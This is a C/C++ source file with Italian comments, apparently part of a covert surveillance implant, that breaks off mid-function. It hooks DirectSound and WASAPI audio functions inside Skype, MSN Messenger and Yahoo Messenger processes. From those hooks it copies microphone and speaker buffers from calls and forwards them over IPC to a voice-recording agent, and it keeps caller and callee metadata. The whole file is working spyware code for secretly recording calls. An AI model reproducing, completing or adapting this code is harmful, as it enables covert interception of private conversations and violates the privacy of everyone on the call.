#include <shlwapi.h>
#include <mmdeviceapi.h>
#include <audioclient.h>

#include <speex/speex.h>
#include "dsound.h"

#define SAMPLE_RATE_DEFAULT	48000
#define SAMPLE_RATE_SKYPE	48000
#define SAMPLE_RATE_SKYPE_W	44100
#define SAMPLE_RATE_GTALK	48000
#define SAMPLE_RATE_YMSG	48000
#define SAMPLE_RATE_YMSG_IN	96000
#define SAMPLE_RATE_MSN		16000

typedef MMRESULT (WINAPI *waveOutGetID_t) (HWAVEOUT , LPUINT);
typedef MMRESULT (WINAPI *waveInGetID_t) (HWAVEOUT , LPUINT);
typedef HRESULT (WINAPI *DirectSoundCreate_t) (LPCGUID , LPDIRECTSOUND *, DWORD);
typedef HRESULT (WINAPI *DirectSoundCaptureCreate_t) (LPCGUID , LPDIRECTSOUNDCAPTURE *, DWORD);

// Funzioni risolte nella DLL del CODEC
typedef void *(*speex_encoder_init_t)(SpeexMode *);
typedef int (*speex_encoder_ctl_t)(void *, int, void *);
typedef void (*speex_encoder_destroy_t)(void *);
typedef int (*speex_encode_t)(void *, float *, SpeexBits *);
typedef void (*speex_bits_init_t)(SpeexBits *);
typedef void (*speex_bits_reset_t)(SpeexBits *);
typedef int (*speex_bits_write_t)(SpeexBits *, char *, int);
typedef void (*speex_bits_destroy_t)(SpeexBits *);
typedef SpeexMode *(*speex_lib_get_mode_t)(int);

extern speex_encoder_init_t rel_speex_encoder_init;
extern speex_encoder_ctl_t rel_speex_encoder_ctl;
extern speex_encoder_destroy_t rel_speex_encoder_destroy;
extern speex_encode_t rel_speex_encode;
extern speex_bits_init_t rel_speex_bits_init;
extern speex_bits_reset_t rel_speex_bits_reset;
extern speex_bits_write_t rel_speex_bits_write;
extern speex_bits_destroy_t rel_speex_bits_destroy;
extern speex_lib_get_mode_t rel_speex_lib_get_mode;

typedef struct partner_struct {
	DWORD Id;
	DWORD participants;
	char *peer;
#define VOIP_SKYPE 1
#define VOIP_GTALK 2
#define VOIP_YAHOO 3
#define VOIP_MSMSG 4
#define VOIP_MOBIL 5
#define VOIP_SKWSA 6
#define VOIP_MSNWS 7
	DWORD voip_program;
#define CALL_SKYPE_OLD 1	// Abbiamo ricevuto un chunl audio NON dalle wasapi, quindi ignoriamo quelli provenienti da li'
	DWORD flags;		
	struct partner_struct *next;
} partner_entry;


typedef struct _VoiceAdditionalData {
	UINT uVersion;
		#define LOG_VOICE_VERSION 2008121901
	UINT uChannel;
	UINT uProgramType;
	UINT uSampleRate;
	UINT uIngoing;
	FILETIME start;
	FILETIME stop;
	UINT uCallerIdLen;
	UINT uCalleeIdLen;
} VoiceAdditionalData, *pVoiceAdditionalData;

#define FLAGS_INPUT 1   // Ricevuto dal microfono
#define FLAGS_OUTPUT 2  // Suonato dalla scheda audio

#define FLAGS_SKAPI_INI 4    // Messaggio delle api di Skype (inizializzazione)
#define FLAGS_SKAPI_MSG 8    // Messaggio delle api di Skype
#define FLAGS_SKAPI_WND 16   // Messaggio delle api di Skype (thread di dispatch)
#define FLAGS_SKAPI_SWD 32   // Messaggio delle api di Skype
#define FLAGS_SKAPI_ATT 64   // Messaggio di Skype: Segnala il core che deve fare l'attach per inviare messaggi

#define FLAGS_YMSG_IN  128	// Messaggio delle api di YahooMessenger
#define FLAGS_YMSG_OUT 256	// Messaggio delle api di YahooMessenger

#define FLAGS_GTALK_IN  512  // Messaggio delle api di Gtalk
#define FLAGS_GTALK_OUT 1024 // Messaggio delle api di Gtalk

#define FLAGS_MSN_IN  2048 // Messaggio delle api di Msn Live
#define FLAGS_MSN_OUT 4096 // Messaggio delle api di Msn Live

#define FLAGS_SAMPLING 8192 // Messaggio per indicare il sample rate

// Gli ultimi due bit di flag (2^30 e 2^31) sono riservati al chunk
// audio e contengoono il numero di canali utilizzato
// In questo caso i bit da 24 a 29 sono usati per identificare il tipo di 
// programma utilizzato <voip_program>

#define MAX_HASHKEY_LEN MAX_PATH*3 // Lunghezza massima chiavi di hash per skype config

#define DEFAULT_SAMPLE_SIZE (512*1024) // 512KB
#define DEFAULT_COMPRESSION 3
#define MAX_ID_LEN 250
#define CALL_DELTA 16 // Intervallo in decimi di secondo che differenzia due chiamate

#define INPUT_ELEM 0
#define OUTPUT_ELEM 1

extern CRITICAL_SECTION skype_critic_sec;
extern partner_entry *call_list_head;
extern BOOL bPM_VoipRecordStarted; // Flag che indica se il monitor e' attivo o meno
extern DWORD sample_size[2];        // Viene inizializzato solo all'inizio
extern DWORD sample_channels[2];	 // Numero di canali
extern DWORD sample_sampling[2]; // Sample rate dei due canali per skype con wasapi
extern FILETIME channel_time_start[2];		 // Time stamp di inizio chiamata
extern FILETIME channel_time_last[2];       // Time stamp dell'ultimo campione
extern BYTE *wave_array[2];	 // Buffer contenenti i PCM dei due canali
extern DWORD max_sample_size; // Dimensione oltre la quale salva un sample su file
extern DWORD compress_factor; // Fattore di compressione del codec
extern HMODULE codec_handle; // Handle alla dll del codec
extern BOOL bPM_spmcp; // Semaforo per l'uscita del thread
extern HANDLE hSkypePMThread;
BOOL IsSkypePMInstalled();

// Sono condivise anche da IM e Contacts
extern HWND skype_api_wnd;
extern HWND skype_pm_wnd;

#include <mmsystem.h>
// XXX Dovrei liberare i buffer e le strutture create
BYTE *GetDirectSoundGetCP(BYTE **DSLock, BYTE **DSUnlock, BYTE **DSGetFormat)
{
	LPDIRECTSOUNDBUFFER lpDSBuffer;
	LPDIRECTSOUND lpDS = NULL;
	PCMWAVEFORMAT pcmwf;
	DSBUFFERDESC dsbdesc;
	BYTE ***interface_ptr;
	BYTE **func_ptr;
	HMODULE hdsound;
	DirectSoundCreate_t pDirectSoundCreate;

	if ( !(hdsound = LoadLibrary("dsound.dll") ) )
		return NULL;
	if ( !(pDirectSoundCreate = (DirectSoundCreate_t)HM_SafeGetProcAddress(hdsound, (char*)"DirectSoundCreate") ) )
		return NULL;

	if (DS_OK != pDirectSoundCreate(NULL, &lpDS, NULL))
		return NULL;

	memset( &pcmwf, 0, sizeof(PCMWAVEFORMAT) );
	pcmwf.wf.wFormatTag         = WAVE_FORMAT_PCM;      
	pcmwf.wf.nChannels          = 1;
	pcmwf.wf.nSamplesPerSec     = 48000;
	pcmwf.wf.nBlockAlign        = (WORD)2;
	pcmwf.wf.nAvgBytesPerSec    = 96000;
	pcmwf.wBitsPerSample        = (WORD)16;

	memset(&dsbdesc, 0, sizeof(DSBUFFERDESC));
	dsbdesc.dwSize              = sizeof(DSBUFFERDESC);
	dsbdesc.dwFlags             = DSBCAPS_CTRLFREQUENCY|DSBCAPS_CTRLPAN|DSBCAPS_CTRLVOLUME ;
	dsbdesc.dwBufferBytes       = 512; 
	dsbdesc.lpwfxFormat         = (LPWAVEFORMATEX)&pcmwf;
		
	if (DS_OK != lpDS->CreateSoundBuffer(&dsbdesc, &lpDSBuffer, NULL))
		return NULL;

	interface_ptr = (BYTE ***)lpDSBuffer;
	func_ptr = *interface_ptr;

	*DSLock   = *(func_ptr + 11);
	*DSUnlock = *(func_ptr + 19);
	*DSGetFormat = *(func_ptr + 5);

	if ((*DSLock) == NULL || (*DSUnlock) == NULL || (*DSGetFormat) == NULL) 
		return NULL;

	func_ptr += 4;
	return *func_ptr;
}

// XXX Dovrei liberare i buffer e le strutture create
BYTE *GetDirectSoundCaptureGetCP(BYTE **DSLock, BYTE **DSUnlock, BYTE **DSGetFormat)
{
	LPDIRECTSOUNDCAPTURE lpDSC;
	LPDIRECTSOUNDCAPTUREBUFFER lpDSCB;
	DSCBUFFERDESC cdbufd;
	PCMWAVEFORMAT pcmwf;
	BYTE ***interface_ptr;
	BYTE **func_ptr;
	HMODULE hdsound;
	DirectSoundCaptureCreate_t pDirectSoundCaptureCreate;

	if ( !(hdsound = LoadLibrary("dsound.dll") ) )
		return NULL;
	if ( !(pDirectSoundCaptureCreate = (DirectSoundCaptureCreate_t)HM_SafeGetProcAddress(hdsound, (char *)"DirectSoundCaptureCreate") ) )
		return NULL;

	if ( DS_OK != pDirectSoundCaptureCreate(NULL, &lpDSC, NULL))
		return NULL;

	memset( &pcmwf, 0, sizeof(PCMWAVEFORMAT) );
	pcmwf.wf.wFormatTag         = WAVE_FORMAT_PCM;      
	pcmwf.wf.nChannels          = 1;
	pcmwf.wf.nSamplesPerSec     = 48000;
	pcmwf.wf.nBlockAlign        = (WORD)2;
	pcmwf.wf.nAvgBytesPerSec    = 96000;
	pcmwf.wBitsPerSample        = (WORD)16;

	memset(&cdbufd, 0, sizeof(cdbufd));
	cdbufd.dwSize = sizeof(DSCBUFFERDESC);
	cdbufd.dwBufferBytes = 100;
	cdbufd.lpwfxFormat = (LPWAVEFORMATEX)&pcmwf;
	
	if (DS_OK != lpDSC->CreateCaptureBuffer(&cdbufd, &lpDSCB, NULL))
		return NULL;

	interface_ptr = (BYTE ***)lpDSCB;
	func_ptr = *interface_ptr;

	*DSLock   = *(func_ptr + 8);
	*DSUnlock = *(func_ptr + 11);
	*DSGetFormat = *(func_ptr + 5);

	if ((*DSLock) == NULL || (*DSUnlock) == NULL || (*DSGetFormat) == NULL) 
		return NULL;

	func_ptr += 4;
	return *func_ptr;
}

typedef DWORD (WINAPI *DSLock_t)(DWORD, DWORD, DWORD, LPVOID *, LPDWORD, LPVOID *, LPDWORD, DWORD);
typedef DWORD (WINAPI *DSUnlock_t)(DWORD, LPVOID, DWORD, LPVOID, DWORD);
typedef DWORD (WINAPI *DSGetFormat_t)(DWORD, LPVOID, DWORD, LPDWORD);


///////////////////////////
//
//   Dsound::DSGetCP
//
///////////////////////////
typedef struct {
	COMMONDATA;
	DWORD prog_type;
	DWORD old_play_c;
	DWORD saved_cp;
	BYTE *buffer_address;
	DWORD buffer_tot_len;
	DSLock_t pDSLock;
	DSUnlock_t pDSUnlock;
	DSGetFormat_t pDSGetFormat;
} DSGetCPStruct;

DSGetCPStruct DSGetCPData;
#define THRESHOLD 0x3C0


#define LARGE_CLI_WRITE(x, y, z, k) { BYTE *wave_ptr = x; \
		                           DWORD to_write = y; \
		                           while (to_write > 0) { \
			                          if (to_write <= MAX_MSG_LEN) { \
				                         pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, wave_ptr, to_write, z, k); \
		 		                         to_write = 0; \
			                          } else { \
				                         pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, wave_ptr, MAX_MSG_LEN, z, k); \
				                         wave_ptr += MAX_MSG_LEN; \
									     to_write -= MAX_MSG_LEN; }}}

DWORD __stdcall PM_DSGetCP(DWORD class_ptr,
                           DWORD *write_c,
					  	   DWORD *play_c)
{
	BOOL *Active;
	DWORD *dummy1;
	DWORD dummy2;
	BYTE *temp_buf;
	DWORD temp_len;
	DWORD new_counter;
	WAVEFORMATEX wfx_format;
	
	MARK_HOOK

	INIT_WRAPPER(DSGetCPStruct)
	CALL_ORIGINAL_API(3);

	// Se qualcosa e' andato storto, ritorna
	if(!((DWORD)pData->pHM_IpcCliWrite) || ret_code!=DS_OK)
		return ret_code;

	// Copia il valore in locale per evitare race
	if (play_c == NULL)
		return ret_code;

	new_counter = *play_c;

	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (!Active || !(*Active))
		return ret_code;

	// Locka l'intero buffer
	// lo fa ogni volta per trovare gli indirizzi anche quando
	// cambia il buffer lasciando invariato il class_ptr
	if (pData->pDSLock(class_ptr, 0, 0, (LPVOID *)&temp_buf, &temp_len, (LPVOID *)&(dummy1), &(dummy2), DSBLOCK_ENTIREBUFFER) != DS_OK) 
		return ret_code;

	pData->pDSUnlock(class_ptr, temp_buf, temp_len, dummy1, dummy2);
	wfx_format.nChannels = 2;
	pData->pDSGetFormat(class_ptr, &wfx_format, sizeof(WAVEFORMATEX), NULL);


	// Se e' la prima volta che lo chiama (o ha cambiato buffer)
	// salva i valori e ritorna
	if (pData->old_play_c == -1 || pData->saved_cp != class_ptr ||
		pData->buffer_address != temp_buf || pData->buffer_tot_len != temp_len) {
		if ( (new_counter%2)==0 ) {
			pData->old_play_c = new_counter;
			pData->saved_cp = class_ptr;
			pData->buffer_address = temp_buf;
			pData->buffer_tot_len = temp_len;
		}

		return ret_code;
	}

	// Nessun cambiamento
	if (new_counter == pData->old_play_c)
		return ret_code;

	// Non ha wrappato
	if (new_counter > pData->old_play_c) {
		dummy2 = (new_counter - pData->old_play_c);
		if (  dummy2>=THRESHOLD && dummy2<=THRESHOLD*60 && (dummy2%2)==0 ) {
			LARGE_CLI_WRITE((pData->buffer_address + pData->old_play_c), (new_counter - pData->old_play_c), (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
			pData->old_play_c = new_counter;
		}
	} else {
		// Ha wrappato
		dummy2 = new_counter + (pData->buffer_tot_len - pData->old_play_c);
		if (  dummy2>=THRESHOLD && dummy2<=THRESHOLD*60 && (dummy2%2)==0 ) {
			LARGE_CLI_WRITE((pData->buffer_address + pData->old_play_c), (pData->buffer_tot_len - pData->old_play_c), (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
			LARGE_CLI_WRITE((pData->buffer_address), new_counter, (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
			pData->old_play_c = new_counter;
		}
	}

	return ret_code;
}


DWORD PM_DSGetCP_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;
	HMODULE hMod;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (_stricmp(proc_name, "skype.exe") && 
			_stricmp(proc_name, "msnmsgr.exe") &&
			_stricmp(proc_name, "yahoomessenger.exe"))
			return 1; // Hooka solo skype.exe e MSN
		if (!_stricmp(proc_name, "msnmsgr.exe") && IsVista(NULL))
			return 1; // Solo su XP prendiamo le dsound
	} else
		return 1;

	if (!_stricmp(proc_name, "skype.exe"))
		DSGetCPData.prog_type = VOIP_SKYPE;
	else if (!_stricmp(proc_name, "msnmsgr.exe"))
		DSGetCPData.prog_type = VOIP_MSMSG;
	else if (!_stricmp(proc_name, "yahoomessenger.exe"))
		DSGetCPData.prog_type = VOIP_YAHOO;
	else
		DSGetCPData.prog_type = 0;

	DSGetCPData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	DSGetCPData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	DSGetCPData.old_play_c = -1;

	if ( ! (DSGetCPData.bAPIAdd = GetDirectSoundGetCP( (BYTE **)&(DSGetCPData.pDSLock), (BYTE **)&(DSGetCPData.pDSUnlock), (BYTE **)&(DSGetCPData.pDSGetFormat) ) ))
		return 1;

	DSGetCPData.dwHookLen = 980;
	return 0;
}

///////////////////////////
//
//   Dsound::DSCapGetCP
//
///////////////////////////

typedef struct {
	COMMONDATA;
	DWORD prog_type;
	DWORD old_play_c;
	DWORD saved_cp;
	BYTE *buffer_address;
	DWORD buffer_tot_len;
	DSLock_t pDSLock;
	DSUnlock_t pDSUnlock;
	DSGetFormat_t pDSGetFormat;
} DSCapGetCPStruct;

DSCapGetCPStruct DSCapGetCPData;

DWORD __stdcall PM_DSCapGetCP(DWORD class_ptr,
                              DWORD *write_c,
					  	      DWORD *play_c)
{
	BOOL *Active;
	DWORD *dummy1;
	DWORD dummy2;
	BYTE *temp_buf;
	DWORD temp_len;
	WAVEFORMATEX wfx_format;

	MARK_HOOK
	
	INIT_WRAPPER(DSCapGetCPStruct)
	CALL_ORIGINAL_API(3);

	if(play_c == NULL)
		return ret_code;

	// Se e' andato storto, ritorna
	if(!((DWORD)pData->pHM_IpcCliWrite) || ret_code!=DS_OK)
		return ret_code;

	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (!Active || !(*Active))
		return ret_code;

	// Locka l'intero buffer
	// lo fa ogni volta per trovare gli indirizzi anche quando
	// cambia il buffer lasciando invariato il class_ptr
	if (pData->pDSLock(class_ptr, 0, 0, (LPVOID *)&temp_buf, &temp_len, (LPVOID *)&(dummy1), &(dummy2), DSCBLOCK_ENTIREBUFFER) != DS_OK) 
		return ret_code;

	pData->pDSUnlock(class_ptr, temp_buf, temp_len, dummy1, dummy2);
	wfx_format.nChannels = 2;
	pData->pDSGetFormat(class_ptr, &wfx_format, sizeof(WAVEFORMATEX), NULL);

	// Se e' la prima volta che lo chiama (o ha cambiato buffer)
	// salva i valori e ritorna
	if (pData->old_play_c == -1 || pData->saved_cp != class_ptr ||
		pData->buffer_address != temp_buf || pData->buffer_tot_len != temp_len) {
		
		// Check paranoico
		if(play_c)	
			pData->old_play_c = *play_c;
		else
			return ret_code;

		pData->saved_cp = class_ptr;
		pData->buffer_address = temp_buf;
		pData->buffer_tot_len = temp_len;
		return ret_code;
	}

	// Nessuno cambiamento
	if (*play_c == pData->old_play_c)
		return ret_code;

	// Non ha wrappato
	if (*play_c > pData->old_play_c) {
		if ( (*play_c - pData->old_play_c) >= THRESHOLD ) {
			LARGE_CLI_WRITE((pData->buffer_address + pData->old_play_c), (*play_c - pData->old_play_c), (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);
			pData->old_play_c = *play_c;
		}
	} else {
		// Ha wrappato
		if (*play_c + (pData->buffer_tot_len - pData->old_play_c) >= THRESHOLD ) {
			LARGE_CLI_WRITE((pData->buffer_address + pData->old_play_c), (pData->buffer_tot_len - pData->old_play_c), (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);
			LARGE_CLI_WRITE((pData->buffer_address), (*play_c), (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);
			pData->old_play_c = *play_c;
		}
	}

	return ret_code;
}


DWORD PM_DSCapGetCP_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;
	HMODULE hMod;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (_stricmp(proc_name, "skype.exe") &&
			_stricmp(proc_name, "msnmsgr.exe") &&
			_stricmp(proc_name, "yahoomessenger.exe"))
			return 1; // Hooka solo skype.exe e MSN
		if (!_stricmp(proc_name, "msnmsgr.exe") && IsVista(NULL))
			return 1; // Solo su XP prendiamo le dsound
	} else
		return 1;

	DSCapGetCPData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	DSCapGetCPData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	DSCapGetCPData.old_play_c = -1;

	if (!_stricmp(proc_name, "skype.exe"))
		DSCapGetCPData.prog_type = VOIP_SKYPE;
	else if (!_stricmp(proc_name, "msnmsgr.exe"))
		DSCapGetCPData.prog_type = VOIP_MSMSG;
	else if (!_stricmp(proc_name, "yahoomessenger.exe"))
		DSGetCPData.prog_type = VOIP_YAHOO;
	else 
		DSCapGetCPData.prog_type = 0;

	if ( ! (DSCapGetCPData.bAPIAdd = GetDirectSoundCaptureGetCP( (BYTE **)&(DSCapGetCPData.pDSLock), (BYTE **)&(DSCapGetCPData.pDSUnlock), (BYTE **)&(DSCapGetCPData.pDSGetFormat) ) ))
		return 1;

	DSCapGetCPData.dwHookLen = 980;
	return 0;
}


///////////////////////////
//
//   WASAPI
//
///////////////////////////
#define SKYPE_WASAPI_BITS 2
#define MSN_WASAPI_BITS 4
#define WASAPI_GETBUFFER 3
#define WASAPI_RELEASEBUFFER 4
BYTE *GetWASAPIRenderFunctionAddress(IMMDevice *pMMDevice, DWORD func_num, DWORD *n_channels, DWORD *sampling)
{
	BYTE **func_ptr;
	BYTE ***interface_ptr;
	HRESULT hr;
    WAVEFORMATEX *pwfx;
	IAudioClient *pAudioClient = NULL;
	IAudioRenderClient *pAudioRenderClient = NULL;
	
    hr = pMMDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
    if (FAILED(hr)) 
		return NULL;

	hr = pAudioClient->GetMixFormat(&pwfx);
	if (FAILED(hr)) {
		pAudioClient->Release();
		return NULL;
	}

	if (n_channels)
		*n_channels = (DWORD)(pwfx->nChannels);
	if (sampling)
		*sampling = (DWORD)(pwfx->nSamplesPerSec);
	
	hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_EVENTCALLBACK, 0, 0, pwfx, NULL);
    CoTaskMemFree(pwfx);
	if (FAILED(hr)) {
		pAudioClient->Release();
		return NULL;
	}

	hr = pAudioClient->GetService(__uuidof(IAudioRenderClient), (void**)&pAudioRenderClient);
    if (FAILED(hr)) {
		pAudioClient->Release();
		return NULL;
	}

	interface_ptr = (BYTE ***)pAudioRenderClient;
	if (!interface_ptr || !(func_ptr = *interface_ptr)) {
		pAudioRenderClient->Release();
		pAudioClient->Release();
		return NULL;
	}
	func_ptr += func_num; 
	
	pAudioRenderClient->Release();
	pAudioClient->Release();
	return *func_ptr;
}

HRESULT GetWASAPIRenderFunction(BYTE **ret_ptr, DWORD func_num, DWORD *n_channels, DWORD *sampling) 
{
	BYTE *func_ptr;
	IMMDeviceEnumerator *pMMDeviceEnumerator;
	IMMDevice			*pMMDevice;
    HRESULT hr = S_OK;

	CoInitialize(NULL);

    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pMMDeviceEnumerator);
	if (FAILED(hr)) {
		CoUninitialize();
        return hr;
	}

	hr = pMMDeviceEnumerator->GetDefaultAudioEndpoint(eRender, eCommunications, &pMMDevice);
	pMMDeviceEnumerator->Release();
	if (FAILED(hr)) {
		CoUninitialize();
        return hr;
	}

	func_ptr = GetWASAPIRenderFunctionAddress(pMMDevice, func_num, n_channels, sampling);
	pMMDevice->Release();
	CoUninitialize();

	if (func_ptr) {
		*ret_ptr = func_ptr;
		return S_OK;
	}

	return S_FALSE;
}

typedef struct {
	COMMONDATA;
	BYTE *obj_ptr;
	BYTE *obj_ptr2;
	BYTE *audio_data;
	BYTE *audio_data2;
	BOOL active;
	BOOL active2;
} WASAPIGetBufferStruct;

WASAPIGetBufferStruct WASAPIGetBufferData;

HRESULT __stdcall PM_WASAPIGetBuffer(BYTE *class_ptr, 
									 DWORD NumFramesRequested,
									 BYTE **ppData)
{
	BOOL *Active;

	MARK_HOOK
	INIT_WRAPPER(WASAPIGetBufferStruct)
	CALL_ORIGINAL_API(3);

	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (ret_code!=S_OK || !Active || !(*Active))
		return ret_code;

	// E' una nuova chiamata
	if (pData->obj_ptr && pData->obj_ptr2 && pData->obj_ptr!=class_ptr && pData->obj_ptr2!=class_ptr) {
		pData->obj_ptr = NULL;
		pData->obj_ptr2 = NULL;
		pData->active = FALSE;
		pData->active2 = FALSE;
	}

	// Memorizza 2 oggetti
	if (pData->obj_ptr == NULL) {
		pData->obj_ptr = class_ptr;
		pData->audio_data = *ppData;
	} else if (pData->obj_ptr != class_ptr) {
		if (pData->obj_ptr2 == NULL) {
			pData->obj_ptr2 = class_ptr;
			pData->audio_data2 = *ppData;
		}
	}

	if (pData->obj_ptr == class_ptr)
		pData->audio_data = *ppData;

	if (pData->obj_ptr2 == class_ptr)
		pData->audio_data2 = *ppData;	
	
	return ret_code;
}

DWORD PM_WASAPIGetBuffer_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (_stricmp(proc_name, "skype.exe"))
			return 1; // Hooka solo skype.exe
	} else
		return 1;
	
	WASAPIGetBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	WASAPIGetBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	WASAPIGetBufferData.obj_ptr = NULL;
	WASAPIGetBufferData.obj_ptr2 = NULL;
	WASAPIGetBufferData.audio_data = NULL;
	WASAPIGetBufferData.audio_data2 = NULL;
	WASAPIGetBufferData.active = FALSE;
	WASAPIGetBufferData.active2 = FALSE;

	if (GetWASAPIRenderFunction(&(WASAPIGetBufferData.bAPIAdd), WASAPI_GETBUFFER, NULL, NULL) != S_OK)
		return 1;

	WASAPIGetBufferData.dwHookLen = 350;
	return 0;
}

typedef struct {
	COMMONDATA;
	DWORD prog_type;
	WASAPIGetBufferStruct *c_data;
	DWORD n_channels;
	DWORD sampling;
	DWORD sampling2;
} WASAPIReleaseBufferStruct;
WASAPIReleaseBufferStruct WASAPIReleaseBufferData;

HRESULT __stdcall PM_WASAPIReleaseBuffer(BYTE *class_ptr, 
									 DWORD NumFramesWrittem,
									 DWORD Flags)
{
	BOOL *Active;
	DWORD i;

	MARK_HOOK
	INIT_WRAPPER(WASAPIReleaseBufferStruct)
	
	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (Active && (*Active) && NumFramesWrittem>0 && pData->pHM_IpcCliWrite) {
		if (pData->sampling != 0) {
			pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)&(pData->sampling), 4, FLAGS_SAMPLING | FLAGS_OUTPUT, IPC_HI_PRIORITY);
			pData->sampling = 0;
		}

		if (pData->c_data->obj_ptr==class_ptr) {
			// Vede se e' un oggetto in cui sta scrivendo qualcosa
			if (!pData->c_data->active)
				for (i=0; i<256; i++) { 
					if (pData->c_data->audio_data[i] != 0) {
						pData->c_data->active = TRUE;
						break;
					}
				}
			if (pData->c_data->active) 
				LARGE_CLI_WRITE(pData->c_data->audio_data, NumFramesWrittem*SKYPE_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
		}

		if (pData->c_data->obj_ptr2==class_ptr) {
			// Vede se e' un oggetto in cui sta scrivendo qualcosa
			if (!pData->c_data->active2)
				for (i=0; i<256; i++) { 
					if (pData->c_data->audio_data2[i] != 0) {
						pData->c_data->active2 = TRUE;
						break;
					}
				}
			if (pData->c_data->active2) 
				LARGE_CLI_WRITE(pData->c_data->audio_data2, NumFramesWrittem*SKYPE_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
		}

	}

	CALL_ORIGINAL_API(3);
	return ret_code;
}

DWORD PM_WASAPIReleaseBuffer_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (_stricmp(proc_name, "skype.exe"))
			return 1; // Hooka solo skype.exe
	} else
		return 1;
	
	WASAPIReleaseBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	WASAPIReleaseBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	WASAPIReleaseBufferData.c_data = (WASAPIGetBufferStruct *)pData->PARAM[0];
	WASAPIReleaseBufferData.prog_type = VOIP_SKWSA;

	if (GetWASAPIRenderFunction(&(WASAPIReleaseBufferData.bAPIAdd), WASAPI_RELEASEBUFFER, &(WASAPIReleaseBufferData.n_channels), &(WASAPIReleaseBufferData.sampling)) != S_OK)
		return 1;

	WASAPIReleaseBufferData.dwHookLen = 800;
	return 0;
}

BYTE *GetWASAPICaptureFunctionAddress(IMMDevice *pMMDevice, DWORD func_num, DWORD *n_channels, DWORD *sampling)
{
	BYTE **func_ptr;
	BYTE ***interface_ptr;
	HRESULT hr;
    WAVEFORMATEX *pwfx;
	IAudioClient *pAudioClient = NULL;
	IAudioCaptureClient *pAudioCaptureClient = NULL;
	
    hr = pMMDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
    if (FAILED(hr)) 
		return NULL;

	hr = pAudioClient->GetMixFormat(&pwfx);
	if (FAILED(hr)) {
		pAudioClient->Release();
		return NULL;
	}
	if (n_channels)
		*n_channels = (DWORD)(pwfx->nChannels);
	if (sampling)
		*sampling = (DWORD)(pwfx->nSamplesPerSec);
	
	hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_EVENTCALLBACK, 0, 0, pwfx, NULL);
    CoTaskMemFree(pwfx);
	if (FAILED(hr)) {
		pAudioClient->Release();
		return NULL;
	}

	hr = pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pAudioCaptureClient);
    if (FAILED(hr)) {
		pAudioClient->Release();
		return NULL;
	}

	interface_ptr = (BYTE ***)pAudioCaptureClient;
	if (!interface_ptr || !(func_ptr = *interface_ptr)) {
		pAudioCaptureClient->Release();
		pAudioClient->Release();
		return NULL;
	}
	func_ptr += func_num; 
	
	pAudioCaptureClient->Release();
	pAudioClient->Release();
	return *func_ptr;
}

HRESULT GetWASAPICaptureFunction(BYTE **ret_ptr, DWORD func_num, DWORD *n_channels, DWORD *sampling) 
{
